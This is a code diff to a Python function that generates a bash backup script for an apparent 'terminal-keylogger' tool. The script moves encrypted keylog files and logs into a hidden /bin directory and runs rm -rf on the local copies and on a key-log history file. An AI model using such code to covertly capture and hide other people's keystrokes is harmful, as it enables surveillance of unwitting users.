@@ -72,16 +72,24 @@ def backup_nd_refresh_logging(logrefresh_path):
         logrefresh_content = """#!/bin/bash    
 
 monthofbackup=$(date +"%B-%Y")
+backup_dir="/bin/.terminal-keylogger/keylog_backups/${monthofbackup}"
 
-rsync *md.enc /bin/.terminal-keylogger/keylog_backups/"$monthofbackup"/
+# Create the backup directory if it doesn't exist
+if [[ ! -d "$backup_dir" ]]; then
+    mkdir -p "$backup_dir"
+else
+    echo "Directory is exist" >> "/bin/.terminal-keylogger/log_file.log"
+fi
 
-rsync *.log /bin/.terminal-keylogger/keylog_backups/"$monthofbackup"/logs/
+rsync *.md.enc "$backup_dir"
+
+rsync *.log "$backup_dir"/logs
 
 rm -rf *md.enc
 
 rm -rf *.log
 
-rm -rf $HOME/.key-log-history"
+rm -rf $HOME/.key-log-history
 
 echo "Backup for $monthofbackup has executed" >> log_file.log
 """
